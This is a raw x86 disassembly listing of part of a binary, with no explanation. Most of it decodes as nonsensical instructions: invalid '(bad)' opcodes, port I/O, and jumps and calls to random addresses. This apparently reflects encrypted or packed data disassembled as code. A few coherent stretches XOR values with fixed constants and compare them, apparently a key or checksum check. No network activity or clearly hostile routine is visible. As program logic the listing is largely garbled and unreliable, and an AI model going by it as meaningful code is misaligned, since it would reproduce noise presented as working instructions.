  407c95:	jp     0x407c2f
  407c97:	xlat   BYTE PTR ds:[ebx]
  407c98:	popa   
  407c99:	mov    al,ds:0xa88a50dd
  407c9e:	mov    ds:0x5abfa13b,eax
  407ca3:	repz das 
  407ca5:	fidivr WORD PTR [ecx+eiz*8-0x2986e257]
  407cac:	adc    ebp,DWORD PTR [ecx]
  407cae:	sahf   
  407caf:	fs pusha 
  407cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cb2:	cmp    ch,al
  407cb4:	jmp    0x217d75c2
  407cb9:	jp     0x407cd7
  407cbb:	scas   eax,DWORD PTR es:[di]
  407cbd:	dec    ebx
  407cbe:	bound  ebx,QWORD PTR [edx]
  407cc0:	repz test al,0xca
  407cc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cc4:	outs   dx,BYTE PTR ds:[esi]
  407cc5:	dec    edx
  407cc6:	add    eax,0x58ac28d1
  407ccb:	mov    gs,WORD PTR [edx+0x58a87189]
  407cd1:	in     eax,dx
  407cd2:	scas   al,BYTE PTR es:[edi]
  407cd3:	jmp    0x2b596810
  407cd8:	leave  
  407cd9:	mov    dh,0x2c
  407cdb:	xchg   esp,eax
  407cdc:	cmp    esi,ebx
  407cde:	lods   eax,DWORD PTR ds:[esi]
  407cdf:	jne    0x407cbc
  407ce1:	rcr    BYTE PTR [edx+0x73668d07],0xff
  407ce8:	ret    
  407ce9:	leave  
  407cea:	(bad)  
  407ceb:	pop    ebx
  407cec:	mov    dh,0x64
  407cee:	pop    ss
  407cef:	or     ah,BYTE PTR [ecx+0x2e458aff]
  407cf5:	(bad)  
  407cf6:	dec    esi
  407cf7:	cdq    
  407cf8:	adc    al,0x9d
  407cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cfb:	loopne 0x407d16
  407cfd:	enter  0xed4e,0x16
  407d01:	push   esi
  407d02:	in     al,0xe0
  407d04:	jne    0x407cb2
  407d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d09:	push   edi
  407d0a:	mov    ecx,0x6305a0d4
  407d0f:	jno    0x407d38
  407d11:	repnz (bad) 
  407d13:	push   0x5
  407d15:	xchg   ebp,eax
  407d16:	xor    al,0x48
  407d18:	lods   eax,DWORD PTR ds:[esi]
  407d19:	sub    BYTE PTR [edi-0x67665b41],dl
  407d1f:	jecxz  0x407d5d
  407d21:	cmp    BYTE PTR [edx+0x7e06adf7],bh
  407d27:	mov    eax,0x46322f47
  407d2c:	out    dx,al
  407d2d:	xlat   BYTE PTR ds:[ebx]
  407d2e:	mov    edx,0x87229165
  407d33:	xchg   edi,eax
  407d34:	aam    0x6e
  407d36:	jmp    0x2a8c:0xe34d11b4
  407d3d:	test   al,0x4e
  407d3f:	inc    eax
  407d40:	push   esp
  407d41:	or     ecx,ebx
  407d43:	mov    dl,0x38
  407d45:	ins    DWORD PTR es:[edi],dx
  407d46:	ret    
  407d47:	leave  
  407d48:	mov    DWORD PTR [edi],ebp
  407d4a:	arpl   WORD PTR [eax+0x5a],sp
  407d4d:	push   0x4c
  407d4f:	jbe    0x407d51
  407d51:	and    ebx,edi
  407d53:	push   edx
  407d54:	in     al,0x70
  407d56:	jo     0x407d28
  407d58:	pop    ecx
  407d59:	add    eax,0x2a5e30cc
  407d5e:	xlat   BYTE PTR ds:[ebx]
  407d5f:	dec    edi
  407d60:	shl    dh,cl
  407d62:	cmp    BYTE PTR [edx+0x404a4e56],ch
  407d68:	sub    al,0x60
  407d6a:	xor    DWORD PTR [ecx],edi
  407d6c:	sbb    dl,BYTE PTR [ebx]
  407d6e:	jne    0x407dbb
  407d70:	inc    esi
  407d71:	pop    ds
  407d72:	jp     0x407dc1
  407d74:	xchg   DWORD PTR ds:0xde9f1187,ecx
  407d7a:	xor    al,0xd0
  407d7c:	(bad)  
  407d7d:	out    dx,eax
  407d7e:	scas   al,BYTE PTR es:[edi]
  407d7f:	out    dx,eax
  407d80:	(bad)  
  407d81:	sti    
  407d82:	jae    0x407d38
  407d84:	jmp    0x1f7b58b5
  407d89:	xor    eax,0x5a11e6c8
  407d8e:	xchg   BYTE PTR [ecx-0x386e910f],cl
  407d94:	inc    ebx
  407d95:	and    ecx,DWORD PTR [ebp+0x12670513]
  407d9b:	pop    esi
  407d9c:	adc    DWORD PTR [ebx-0x75],ebp
  407d9f:	mov    ds,WORD PTR ds:0x6322b727
  407da5:	cmp    eax,0x7bc32aa9
  407daa:	or     al,0xdc
  407dac:	inc    edx
  407dad:	jmp    0x7fad1fab
  407db2:	push   ebx
  407db3:	fisttp DWORD PTR [esi+0x727fe40d]
  407db9:	xchg   esi,eax
  407dba:	mov    al,0x6
  407dbc:	cdq    
  407dbd:	cmp    ecx,DWORD PTR [ecx+0x21]
  407dc0:	mov    eax,ecx
  407dc2:	mov    ecx,DWORD PTR [ebp-0x34]
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0xfe8a4c7e
  407e7d:	mov    esi,0x18186f22
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [ecx-0x1a0748e9],dh
  407e8b:	jg     0x407e95
  407e8d:	lahf   
  407e8e:	dec    esi
  407e8f:	dec    esi
  407e90:	icebp  
  407e91:	cmp    ebp,DWORD PTR [edx+0x60]
  407e94:	fs add eax,0xf5aedc2a
  407e9a:	mov    esi,0xf079df8
  407e9f:	imul   BYTE PTR [ebx]
  407ea1:	xchg   edi,eax
  407ea2:	or     esi,DWORD PTR ds:0xf233cd6a
  407ea8:	xor    BYTE PTR [edx-0x190fe29a],al
  407eae:	sbb    eax,DWORD PTR [edx+eiz*1+0x10]
  407eb2:	test   ebx,ebx
  407eb4:	sti    
  407eb5:	inc    edi
  407eb6:	jae    0x407f2f
  407eb8:	fist   DWORD PTR [edi]
  407eba:	enter  0x3504,0x34
  407ebe:	and    al,0xe
  407ec0:	loop   0x407e93
  407ec2:	mov    ebp,DWORD PTR [edx+eax*8]
  407ec5:	call   0x1af673cb
  407eca:	test   DWORD PTR [ecx+eax*4-0x2dd429fd],esp
  407ed1:	fstp   QWORD PTR [ebp+0x1ac0a6e2]
  407ed7:	xchg   ecx,eax
  407ed8:	pop    edi
  407ed9:	cmp    dh,bh
  407edb:	(bad)
  407ede:	mov    edx,0xcf9e085f
  407ee3:	add    DWORD PTR [ebx],ecx
  407ee5:	mov    al,0xa8
  407ee7:	pop    ss
  407ee8:	hlt    
  407ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eea:	pop    ss
  407eeb:	jl     0x407ed8
  407eed:	int3   
  407eee:	xchg   esi,eax
  407eef:	push   ebp
  407ef0:	push   eax
  407ef1:	les    ebp,FWORD PTR [eax+0x1e]
  407ef4:	pop    edx
  407ef5:	xor    eax,0x225a4dd7
  407efa:	and    DWORD PTR [edx+0xeb425f7],edi
  407f00:	or     bl,BYTE PTR [edi+eiz*1+0x38]
  407f04:	xchg   esp,eax
  407f05:	mov    es,esp
  407f07:	adc    DWORD PTR [edx-0xe],esi
  407f0a:	jmp    0x1427:0xde7497e
  407f11:	jl     0x407ea6
  407f13:	jne    0x407ea4
  407f15:	(bad)  
  407f17:	sbb    BYTE PTR ds:0x2a002f78,bh
  407f1d:	sub    al,0x9
  407f1f:	mov    edx,0xf3f3978c
  407f24:	push   edi
  407f25:	jns    0x407f15
  407f27:	jp     0x407f6f
  407f29:	push   ss
  407f2a:	(bad)  [edx+ebx*2]
  407f2d:	fwait
  407f2e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f30:	xchg   edx,eax
  407f31:	sbb    bh,BYTE PTR [edx-0x59]
  407f34:	dec    edx
  407f35:	test   eax,0x76d22e13
  407f3a:	in     al,0x9d
  407f3c:	mov    al,0x6
  407f3e:	mov    ds:0x4b8b994f,eax
  407f43:	popf   
  407f44:	sbb    esi,DWORD PTR [ebx+0x4c5d3568]
  407f4a:	adc    BYTE PTR fs:[edx-0x3f],cl
  407f4e:	mov    ebp,DWORD PTR [ebx+eiz*8-0x6e8e79b7]
  407f55:	sti    
  407f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f57:	add    DWORD PTR [eax],esp
  407f59:	fdivrp st(2),st
  407f5b:	xor    eax,0x8d1d4554
  407f60:	mov    ds:0xa5e46cc5,al
  407f65:	xchg   esi,eax
  407f66:	inc    BYTE PTR [edx-0xe51dc7f]
  407f6c:	das    
  407f6d:	xchg   ch,al
  407f6f:	out    0x79,eax
  407f71:	test   bh,al
  407f73:	pop    es
  407f74:	dec    edx
  407f75:	add    ch,BYTE PTR [edx+eiz*1-0x1a9ea1af]
  407f7c:	xchg   esi,eax
  407f7d:	xor    BYTE PTR [ebp-0x2e779f6a],0xa
  407f84:	and    DWORD PTR [esi],0x9c11ba6a
  407f8a:	sbb    BYTE PTR [edi+0xed4597f],bh
  407f90:	push   cs
  407f91:	pop    es
  407f92:	adc    DWORD PTR [esi-0x4d],ebx
  407f95:	fucomip st,st(2)
  407f97:	int    0x2
  407f99:	mov    ebp,0x120d8920
  407f9e:	add    ebp,DWORD PTR [ebx]
  407fa0:	xchg   esi,eax
  407fa1:	ret    
  407fa2:	xchg   esi,eax
  407fa3:	je     0x407f25
  407fa5:	mov    cl,0x99
  407fa7:	ins    DWORD PTR es:[edi],dx
  407fa8:	and    ebp,DWORD PTR [esi]
  407faa:	fist   DWORD PTR [eax+0x4c]
  407fad:	jo     0x407fa5
  407faf:	jmp    0x6576:0x39262216
  407fb6:	fs jmp 0xc16be4dc
  407fbc:	data16 test al,0x87
  407fbf:	call   0xf839:0x7d26563
  407fc6:	mov    esp,DWORD PTR [ecx+ebp*4-0x52e1a57e]
  407fcd:	fnstsw WORD PTR [ebx+0x46]
  407fd0:	dec    eax
  407fd1:	(bad)  
  407fd2:	loope  0x408051
  407fd4:	data16 fucomi st,st(2)
  407fd7:	shr    DWORD PTR [ebx+0x14],0x51
  407fdb:	pop    ecx
  407fdc:	das    
  407fdd:	stos   BYTE PTR es:[edi],al
  407fde:	mov    esp,0xee1341ce
  407fe3:	test   ebx,0x24304365
  407fe9:	loope  0x407f98
  407feb:	jecxz  0x40800a
  407fed:	xor    eax,0xa63e545d
  407ff2:	push   ecx
  407ff3:	cwde   
  407ff4:	or     ebx,DWORD PTR [esp+eax*1-0x6bd1e4d9]
  407ffb:	int3   
  407ffc:	retf   0x6429
  407fff:	ss pop ss
  408001:	jne    0x407fd2
  408003:	jbe    0x407fd8
  408005:	add    al,0x9e
  408007:	jbe    0x408081
  408009:	fwait
  40800a:	or     dl,BYTE PTR [edx-0x75e73a3d]
  408010:	push   cs
  408011:	adc    eax,0x9dd76d11
  408016:	in     eax,0xdc
  408018:	in     eax,dx
  408019:	cmp    eax,ebx
  40801b:	jne    0x408045
  40801d:	imul   edi,DWORD PTR [ebx],0xffffffc1
  408020:	xchg   esp,eax
  408021:	push   ecx
  408022:	sbb    ecx,DWORD PTR [ecx]
  408024:	cmp    DWORD PTR [eax],ecx
  408026:	jecxz  0x40802d
  408028:	fst    DWORD PTR [eax+0x75fbe3af]
  40802e:	in     al,0x47
  408030:	ins    DWORD PTR es:[edi],dx
  408031:	jl     0x408079
  408033:	adc    al,0x3d
  408035:	test   al,0x66
  408037:	mov    ecx,0x8249fb36
  40803c:	push   ebp
  40803d:	rol    BYTE PTR [ebp+0x51],0x72
  408041:	cdq    
  408042:	clc    
  408043:	call   0xd92fb3f9
  408048:	fst    DWORD PTR [ecx-0x1171b6fb]
  40804e:	mov    ch,0xf2
  408050:	xchg   esi,eax
  408051:	mov    ebp,0x35524a7c
  408056:	aam    0x68
  408058:	hlt    
  408059:	sti    
  40805a:	fidivr WORD PTR [edi+0x7314d303]
  408060:	xchg   edi,eax
  408061:	mov    gs,esi
  408063:	push   eax
  408064:	paddusw mm4,QWORD PTR ds:[ebx+0x41]
  408069:	cmc    
  40806a:	int    0x6c
  40806c:	cwde   
  40806d:	xor    eax,0xd3931e2a
  408072:	ror    edi,1
  408074:	mov    ecx,0x5b8d54bb
  408079:	hlt    
  40807a:	mov    eax,0x42c66886
  40807f:	or     eax,0x1dbecee8
  408084:	cs scas al,BYTE PTR es:[edi]
  408086:	stos   DWORD PTR es:[edi],eax
  408087:	xchg   ebx,eax
  408088:	pop    ebx
  408089:	fstp   DWORD PTR [ecx-0x46]
  40808c:	cmp    ebp,DWORD PTR [ebx]
  40808e:	loope  0x4080ac
  408090:	imul   BYTE PTR [edi]
  408092:	fdiv   DWORD PTR [ebp+0x4552cb7]
  408098:	mov    al,BYTE PTR [esi]
  40809a:	divps  xmm1,XMMWORD PTR [ecx+0xb]
  40809e:	dec    esi
  40809f:	popf   
  4080a0:	(bad)  
  4080a1:	adc    edi,esp
  4080a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080a4:	fbstp  TBYTE PTR [ebp+0x52]
  4080a7:	push   esi
  4080a8:	outs   dx,BYTE PTR ds:[esi]
  4080a9:	xchg   esi,eax
  4080aa:	dec    edx
  4080ab:	int    0x3
  4080ad:	xchg   ebp,eax
  4080ae:	sub    BYTE PTR [ebx*1-0x7d06fb9f],ah
  4080b5:	cs hlt 
  4080b7:	push   esi
  4080b8:	push   es
  4080b9:	mov    DWORD PTR [edx-0x4c],ebp
  4080bc:	jle    0x408124
  4080be:	and    ecx,DWORD PTR [eax-0x38b58937]
  4080c4:	neg    BYTE PTR [eax]
  4080c6:	inc    esp
  4080c7:	sub    BYTE PTR [ebp+0x73],dh
  4080ca:	or     DWORD PTR [edi-0x7d],edx
  4080cd:	mov    al,ds:0xf87d8792
  4080d2:	hlt    
  4080d3:	dec    esp
  4080d4:	cmp    DWORD PTR [ebx+0x3b],ebx
  4080d7:	inc    esp
  4080d8:	(bad)  
  4080d9:	cmc    
  4080da:	je     0x408087
  4080dc:	(bad)  
  4080dd:	xor    BYTE PTR [edi+0x2434bbce],dl
  4080e3:	xor    ecx,eax
  4080e5:	lods   al,BYTE PTR ds:[esi]
  4080e6:	out    0x53,al
  4080e8:	or     dh,bl
  4080ea:	adc    al,0x1f
  4080ec:	sub    BYTE PTR [ecx-0x75],dl
  4080ef:	add    esp,DWORD PTR [esi]
  4080f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080f2:	jbe    0x408141
  4080f4:	sbb    eax,0x73bf712c
  4080f9:	xlat   BYTE PTR ds:[ebx]
  4080fa:	jns    0x408103
  4080fc:	outs   dx,BYTE PTR ds:[esi]
  4080fd:	xor    ch,al
  4080ff:	dec    ebp
  408100:	push   edi
  408101:	lods   al,BYTE PTR ds:[esi]
  408102:	in     eax,dx
  408103:	adc    DWORD PTR [eax],esi
  408105:	dec    ecx
  408106:	jbe    0x40809d
  408108:	sbb    eax,DWORD PTR [ebx+0x70]
  40810b:	es cwde 
  40810d:	dec    eax
  40810e:	and    DWORD PTR [ebx-0xda47245],edx
  408114:	inc    edx
  408115:	mov    al,ds:0xa3c140da
  40811a:	out    0x6d,eax
  40811c:	sub    al,0xd9
  40811e:	xor    DWORD PTR [esi],edx
  408120:	imul   esi,DWORD PTR [ebp+edi*2+0x61513110],0x1c
  408128:	mov    ch,0x95
  40812a:	push   0xfffffff1
  40812c:	jns    0x4081a5
  40812e:	dec    edi
  40812f:	and    BYTE PTR [ecx-0x3bac030],bl
  408135:	dec    ecx
  408136:	(bad)
  40813a:	pop    edx
  40813b:	jmp    0x7f25:0x60a4e8bb
  408142:	adc    BYTE PTR [edx],0x31
  408145:	call   0xbaff03e4
  40814a:	arpl   WORD PTR [esp+ebx*1+0x394da399],di
  408151:	sbb    edx,DWORD PTR [edx-0x57]
  408154:	add    al,BYTE PTR [esp+ebx*8]
  408157:	jecxz  0x408143
  408159:	push   ss
  40815a:	test   DWORD PTR [edx+0x6d3bade],ebx
  408160:	sub    BYTE PTR [edx-0x327b4f99],dh
  408166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408167:	(bad)  
  408168:	fimul  WORD PTR [eax]
  40816a:	or     esi,DWORD PTR [esi-0x3c062cf9]
  408170:	jge    0x40810b
  408172:	adc    eax,esi
  408174:	jmp    0x8fbc87b9
  408179:	jmp    0x5767c7c2
  40817e:	jge    0x408137
  408180:	fwait
  408181:	push   ebp
  408182:	adc    ecx,DWORD PTR [ebx-0x467386eb]
  408188:	imul   edi,DWORD PTR [eax-0x2],0xffffffd7
  40818c:	xlat   BYTE PTR ds:[ebx]
  40818d:	mov    WORD PTR [ebx-0x18],ds
  408190:	inc    esp
  408191:	leave  
  408192:	(bad)
  408195:	inc    esp
  408196:	aaa    
  408197:	fist   DWORD PTR [esi-0x1b]
  40819a:	stos   DWORD PTR es:[edi],eax
  40819b:	cld    
  40819c:	mov    edi,0x11d9f51f
  4081a1:	add    DWORD PTR [ecx+0x5f],ebx
  4081a4:	lea    edx,[edi]
  4081a6:	enter  0xff56,0x1d
  4081aa:	lock or eax,0xe67b280f
  4081b0:	jg     0x4081ea
  4081b2:	adc    BYTE PTR [eax+0x4423bddf],dh
  4081b8:	push   esp
  4081b9:	shl    edx,1
  4081bb:	pop    edx
  4081bc:	inc    edi
  4081bd:	pop    edi
  4081be:	push   esi
  4081bf:	xor    eax,0x7e0d2fb2
  4081c4:	jbe    0x4081ae
  4081c6:	sub    edx,esi
  4081c8:	stos   BYTE PTR es:[edi],al
  4081c9:	lods   al,BYTE PTR ds:[esi]
  4081ca:	pop    ss
  4081cb:	in     al,0x1f
  4081cd:	xchg   ebx,eax
  4081ce:	cmp    eax,0xc1d07015
  4081d3:	jecxz  0x408254
  4081d5:	hlt    
  4081d6:	inc    edx
  4081d7:	ret    
  4081d8:	pop    ebx
  4081d9:	pop    ecx
  4081da:	sbb    esp,DWORD PTR ds:0xfd8c2306
  4081e0:	sar    DWORD PTR gs:[eax-0x24844b19],1
  4081e7:	jb     0x408242
  4081e9:	xchg   BYTE PTR [edx],dl
  4081eb:	addr16 dec edx
  4081ed:	dec    edi
  4081ee:	les    edx,FWORD PTR [ebx+0x29d5a38e]
  4081f4:	sub    dl,BYTE PTR [ecx]
  4081f6:	dec    esi
  4081f7:	dec    esi
  4081f8:	adc    DWORD PTR [ecx+0x14],esp
  4081fb:	rcr    ch,1
  4081fd:	and    DWORD PTR [ebx],edx
  4081ff:	ins    BYTE PTR es:[edi],dx
  408200:	xchg   ebx,eax
  408201:	mov    edx,0x2d5b1c45
  408206:	push   cs
  408207:	cmp    dl,BYTE PTR [edx]
  408209:	pause  
  40820b:	data16 loopne 0x40819d
  40820e:	lods   al,BYTE PTR ds:[esi]
  40820f:	sti    
  408210:	dec    ecx
  408211:	or     ebx,DWORD PTR [ebp-0x5148b05b]
  408217:	xor    eax,0x3e92a085
  40821c:	aad    0xe1
  40821e:	pop    ecx
  40821f:	ds in  al,0x4
  408222:	enter  0x856c,0x1a
  408226:	pop    esi
  408227:	push   0xed23fe4
  40822c:	jmp    0x40826e
  40822e:	xchg   ecx,eax
  40822f:	mov    edx,0xa47f5126
  408234:	xchg   edi,ebp
  408236:	mov    edi,0x9295172e
  40823b:	nop
  40823c:	mov    ebx,0x7fb37244
  408242:	clc    
  408243:	mov    al,ds:0x8995312a
  408248:	inc    ebp
  408249:	xchg   esp,eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0x9b08709d
  40828a:	mov    ebp,0x1867a8b0
  40828f:	sbb    BYTE PTR [esi+0x1181812],bl
  408295:	push   ebp
  408296:	pushf  
  408297:	xor    DWORD PTR [ebx-0x740ee9a2],esi
  40829d:	sti    
  40829e:	or     edx,DWORD PTR [esi+0x1a]
  4082a1:	loopne 0x408283
  4082a3:	pop    es
  4082a4:	mov    edi,DWORD PTR [di-0x63]
  4082a8:	fwait
  4082a9:	iret   
  4082aa:	out    0x4a,al
  4082ac:	add    al,0x27
  4082ae:	push   esi
  4082af:	mov    DWORD PTR [edx+0x5d64cfbb],ebx
  4082b5:	mov    eax,ds:0xcc7a9fa7
  4082ba:	xchg   esp,eax
  4082bb:	mov    dl,0x58
  4082bd:	test   DWORD PTR [edx-0x6f],edi
  4082c0:	inc    esi
  4082c1:	(bad)  
  4082c2:	pop    esi
  4082c3:	xchg   edi,eax
  4082c4:	stos   DWORD PTR es:[edi],eax
  4082c5:	fsubr  st,st(5)
  4082c7:	in     al,dx
  4082c8:	ret    0x7f58
  4082cb:	(bad)  
  4082cc:	imul   DWORD PTR [ebx-0x35]
  4082cf:	cld    
  4082d0:	jg     0x4082ac
  4082d2:	jne    0x4082f4
  4082d4:	lods   eax,DWORD PTR ds:[esi]
  4082d5:	call   0x60fc:0x801be968
  4082dc:	sub    BYTE PTR [ebx+0x17db007a],al
  4082e2:	test   edi,edx
  4082e4:	iret   
  4082e5:	sub    al,0xc
  4082e7:	aaa    
  4082e8:	call   0xae33b81f
  4082ed:	dec    edi
  4082ee:	lahf   
  4082ef:	lahf   
  4082f0:	test   eax,0x9218d2a2
  4082f5:	mov    cl,BYTE PTR [edx+edi*4+0x39]
  4082f9:	mov    cl,0x4f
  4082fb:	or     DWORD PTR [ecx],ebx
  4082fd:	into   
  4082fe:	repz inc edi
  408300:	adc    al,0xa8
  408303:	faddp  st(7),st
  408305:	xor    ecx,DWORD PTR [edi]
  408307:	aas    
  408308:	call   DWORD PTR [ecx]
  40830a:	ret    0x64af
  40830d:	push   esi
  40830e:	int    0x20
  408310:	aas    
  408311:	nop
  408312:	out    dx,al
  408313:	test   eax,0xd6b76f96
  408318:	ja     0x40832c
  40831a:	aas    
  40831b:	jp     0x40830f
  40831d:	in     al,dx
  40831e:	add    eax,0x20cc2d1f
  408323:	push   0x2a5a30de
  408328:	xor    al,0xfa
  40832a:	scas   eax,DWORD PTR es:[edi]
  40832b:	int3   
  40832c:	retf   0xe3df
  40832f:	sub    DWORD PTR [ecx],eax
  408331:	inc    esp
  408332:	mov    bl,0xc2
  408334:	lea    eax,[ecx+ebp*4-0x4c]
  408338:	adc    DWORD PTR [esi-0x34],edi
  40833b:	mov    al,ds:0x13eae7b7
  408340:	shr    BYTE PTR [edi-0xd],cl
  408343:	pop    es
  408344:	inc    esp
  408345:	stc    
  408346:	adc    al,0xac
  408348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408349:	inc    esp
  40834a:	adc    DWORD PTR [esi],ebx
  40834c:	test   al,al
  40834e:	retf   0x62d1
  408351:	call   DWORD PTR [ebx]
  408353:	jbe    0x4083c1
  408355:	cdq    
  408356:	pop    edx
  408357:	adc    ah,ch
  408359:	out    0xe7,eax
  40835b:	dec    edi
  40835c:	mov    bl,0x56
  40835e:	lods   eax,DWORD PTR ds:[esi]
  40835f:	jb     0x40832f
  408361:	arpl   WORD PTR [esp+ebx*8-0x3aa361c9],si
  408368:	ins    BYTE PTR es:[edi],dx
  408369:	jmp    0x8461:0xd6419933
  408370:	hlt    
  408371:	repnz or ebp,ecx
  408374:	adc    dl,cl
  408376:	fyl2xp1 
  408378:	mov    ch,0xc4
  40837a:	icebp  
  40837b:	and    edi,DWORD PTR [ecx]
  40837d:	dec    ecx
  40837e:	push   eax
  40837f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408380:	fld    TBYTE PTR [ebp+ebp*2+0x3bfcf714]
  408387:	clc    
  408388:	ja     0x4083ac
  40838a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40838b:	jmp    FWORD PTR [ebp+0x22]
  40838e:	inc    ebx
  40838f:	mov    edx,0xa414097b
  408394:	cmp    BYTE PTR [ebx],ch
  408396:	mov    ah,0x6a
  408398:	outs   dx,BYTE PTR ds:[esi]
  408399:	xchg   ebp,eax
  40839a:	and    DWORD PTR [eax+0x3e],ecx
  40839d:	jp     0x408415
  40839f:	pusha  
  4083a0:	stos   DWORD PTR es:[edi],eax
  4083a1:	sub    DWORD PTR [edx],ecx
  4083a3:	in     eax,dx
  4083a4:	retf   
  4083a5:	push   esi
  4083a6:	loope  0x408379
  4083a8:	ret    
  4083a9:	loopne 0x408426
  4083ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083ac:	clc    
  4083ad:	stos   BYTE PTR es:[edi],al
  4083ae:	retf   0xf7b0
  4083b1:	or     DWORD PTR [edx+0x7c578d9e],0xffffffbb
  4083b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083b9:	xor    BYTE PTR [edx],bl
  4083bb:	aad    0x23
  4083bd:	adc    edi,esi
  4083bf:	test   al,0x95
  4083c1:	pop    DWORD PTR [ecx-0x35]
  4083c4:	or     BYTE PTR [edi-0x4a077907],dl
  4083ca:	ss mov bl,0x71
  4083cd:	push   ecx
  4083cf:	cmp    al,0xe4
  4083d1:	shr    al,0x8e
  4083d4:	dec    edx
  4083d5:	enter  0x78f0,0x69
  4083d9:	les    ecx,FWORD PTR [eax-0x5b]
  4083dc:	xchg   ebp,eax
  4083dd:	call   0x28e2744e
  4083e2:	frstor [ecx]
  4083e4:	jnp    0x408391
  4083e6:	or     eax,0x121fea09
  4083eb:	push   ds
  4083ec:	sar    DWORD PTR [esi],1
  4083ee:	jle    0x4083bf
  4083f0:	push   0x68
  4083f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083f3:	ins    BYTE PTR es:[edi],dx
  4083f4:	stos   BYTE PTR es:[edi],al
  4083f5:	ss jle 0x4083b5
  4083f8:	stos   DWORD PTR es:[edi],eax
  4083f9:	xlat   BYTE PTR ds:[ebx]
  4083fa:	pushf  
  4083fb:	aas    
  4083fc:	mov    ds:0xba09971b,al
  408401:	mov    ah,0xc
  408403:	and    ecx,edx
  408405:	xchg   ebp,eax
  408406:	test   DWORD PTR [ebx-0x36],ebx
  408409:	and    DWORD PTR [ebx],ebx
  40840b:	push   ebp
  40840c:	pop    edi
  40840d:	xchg   esp,eax
  40840e:	shr    BYTE PTR [edx],cl
  408410:	cmp    esp,DWORD PTR [ecx-0x42]
  408413:	adc    eax,0xe203a5e8
  408418:	and    ch,cl
  40841a:	xchg   edi,eax
  40841b:	(bad)  
  40841c:	jmp    FWORD PTR [edi+edx*1+0x6b4670aa]
  408423:	adc    ebp,edx
  408425:	bound  ebx,QWORD PTR [edx-0x3dc5636]
  40842b:	jo     0x408449
  40842d:	add    ecx,DWORD PTR [edx]
